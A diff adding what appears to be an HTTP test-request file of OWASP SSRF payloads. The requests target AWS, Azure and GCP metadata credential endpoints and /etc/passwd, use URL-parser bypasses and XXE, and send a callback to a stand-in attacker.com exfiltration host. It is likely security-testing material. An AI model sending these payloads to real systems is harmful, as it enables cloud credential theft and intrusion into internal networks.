@@ -1,0 +1,66 @@
+# OWASP Top 10 - A10:2021 Server-Side Request Forgery (SSRF)
+# Falsification de requêtes côté serveur
+
+### SSRF - Internal Network Scan
+GET /fetch?url=http://192.168.1.1 HTTP/1.1
+Host: {{host}}
+
+### SSRF - Cloud Metadata (AWS)
+GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
+Host: {{host}}
+
+### SSRF - Cloud Metadata (Azure)
+GET /fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 HTTP/1.1
+Host: {{host}}
+Metadata: true
+
+### SSRF - Cloud Metadata (GCP)
+GET /fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1
+Host: {{host}}
+Metadata-Flavor: Google
+
+### SSRF - Localhost Access
+GET /fetch?url=http://localhost:8080/admin HTTP/1.1
+Host: {{host}}
+
+### SSRF - File Protocol
+GET /fetch?url=file:///etc/passwd HTTP/1.1
+Host: {{host}}
+
+### SSRF - DNS Rebinding
+GET /fetch?url=http://attacker-controlled-dns.com HTTP/1.1
+Host: {{host}}
+
+### SSRF - URL Bypass with @
+GET /fetch?url=http://expected.com@169.254.169.254/metadata HTTP/1.1
+Host: {{host}}
+
+### SSRF - URL Bypass with Encoding
+GET /fetch?url=http://127.0.0.1%2f%2f@169.254.169.254 HTTP/1.1
+Host: {{host}}
+
+### SSRF - Blind SSRF
+POST /webhook HTTP/1.1
+Host: {{host}}
+Content-Type: application/json
+Content-Length: 50
+
+{"callback_url": "http://attacker.com/exfiltrate"}
+
+### SSRF - PDF Generator
+POST /generate-pdf HTTP/1.1
+Host: {{host}}
+Content-Type: application/json
+Content-Length: 80
+
+{"html": "<img src='http://169.254.169.254/latest/meta-data/'>"}
+
+### SSRF - XML External Entity
+POST /api/xml HTTP/1.1
+Host: {{host}}
+Content-Type: application/xml
+Content-Length: 180
+
+<?xml version="1.0"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
+<data>&xxe;</data>
